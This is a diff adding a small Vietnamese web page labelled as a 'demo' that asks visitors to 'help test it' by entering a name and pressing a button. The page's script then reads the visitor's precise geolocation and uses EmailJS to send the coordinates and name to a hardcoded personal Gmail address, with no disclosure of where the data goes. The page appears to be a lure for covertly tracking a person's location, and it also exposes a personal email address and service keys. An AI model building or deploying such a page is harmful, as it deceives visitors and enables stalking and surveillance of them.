@@ -1,0 +1,155 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+  <title>demo</title>
+  <script src="https://cdn.jsdelivr.net/npm/@emailjs/browser@3/dist/email.min.js"></script>
+  <script>
+    (function() {
+      emailjs.init("4OQAqbNTwSeMbQUcX");
+    })();
+  </script>
+  <style>
+    /* Cài đặt tổng thể */
+    body {
+      margin: 0;
+      padding: 0;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      background: linear-gradient(135deg, #f6d365, #fda085);
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      color: #333;
+    }
+    .container {
+      background: rgba(255, 255, 255, 0.95);
+      padding: 30px 40px;
+      border-radius: 12px;
+      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.2);
+      text-align: center;
+      max-width: 400px;
+      width: 90%;
+    }
+    h2 {
+      margin-bottom: 20px;
+      font-weight: 600;
+    }
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      margin: 10px 0;
+      border: 1px solid #ccc;
+      border-radius: 8px;
+      font-size: 16px;
+      transition: border-color 0.3s ease;
+    }
+    input[type="text"]:focus {
+      border-color: #fda085;
+      outline: none;
+    }
+    button {
+      background: #fda085;
+      color: #fff;
+      border: none;
+      padding: 12px 20px;
+      font-size: 16px;
+      border-radius: 8px;
+      cursor: pointer;
+      transition: background 0.3s ease;
+      margin-top: 10px;
+    }
+    button:hover {
+      background: #f06d5e;
+    }
+    #status {
+      font-size: 18px;
+      margin-top: 20px;
+      white-space: pre-line;
+    }
+    .loading {
+      color: #007bff;
+      font-weight: bold;
+    }
+    .success {
+      color: #28a745;
+    }
+    .error {
+      color: #dc3545;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <h2>Giúp Tôi Test Nó Nhé</h2>
+    <input type="text" id="userName" placeholder="Nhập tên của bạn" />
+    <div id="status" class="loading">Nhấn nút để hoàn thành.</div>
+    <button id="shareBtn">Nhấn Vào</button>
+  </div>
+  
+  <script>
+    const statusDiv = document.getElementById("status");
+    const shareBtn = document.getElementById("shareBtn");
+
+    function updateStatus(message, type = "") {
+      statusDiv.innerText = message;
+      statusDiv.className = type;
+    }
+
+    shareBtn.addEventListener("click", function() {
+      const userName = document.getElementById("userName").value.trim();
+      if (!userName) {
+        updateStatus("Vui lòng nhập tên của bạn.", "error");
+        return;
+      }
+
+      updateStatus("Đang Thực Hiện...", "loading");
+
+      navigator.geolocation.getCurrentPosition(
+        (position) => {
+          const { latitude, longitude } = position.coords;
+          updateStatus(` ${latitude}, ${longitude}\nĐang gửi...`, "loading");
+          console.log("", latitude, longitude);
+
+          if (!latitude || !longitude) {
+            updateStatus("Lỗi: Tọa độ không hợp lệ.", "error");
+            return;
+          }
+
+          emailjs.send(
+            "service_i4tl7m4",
+            "template_2v52xwf",
+            {
+              lat: latitude,
+              lon: longitude,
+              user_name: userName,
+              to_email: "thanhkhazyd598@gmail.com"
+            }
+          )
+          .then(() => {
+            console.log("Email đã gửi thành công!");
+            updateStatus(` ${latitude}, ${longitude}\nEmail đã gửi! Cảm ơn bạn, ${userName}!`, "success");
+          })
+          .catch((error) => {
+            console.error("Lỗi gửi email:", error);
+            updateStatus(`Lỗi gửi email: ${error.text || error}\nVui lòng thử lại sau.`, "error");
+          });
+        },
+        (error) => {
+          console.error("Không có quyền:", error.code, error.message);
+          let message = "";
+          switch (error.code) {
+            case 1: message = "Bạn đã từ chối cấp quyền. Hãy bật quyền truy cập vị trí trong cài đặt trình duyệt."; break;
+            case 2: message = "Không thể xác định vị trí. Vui lòng kiểm tra GPS hoặc kết nối mạng."; break;
+            case 3: message = "Hết thời gian chờ. Vui lòng thử lại."; break;
+            default: message = "Lỗi không xác định. Vui lòng thử lại sau.";
+          }
+          updateStatus(`${message}\nNhấn F5 để thử lại.`, "error");
+        },
+        { timeout: 10000, maximumAge: 0 }
+      );
+    });
+  </script>
+</body>
+</html>
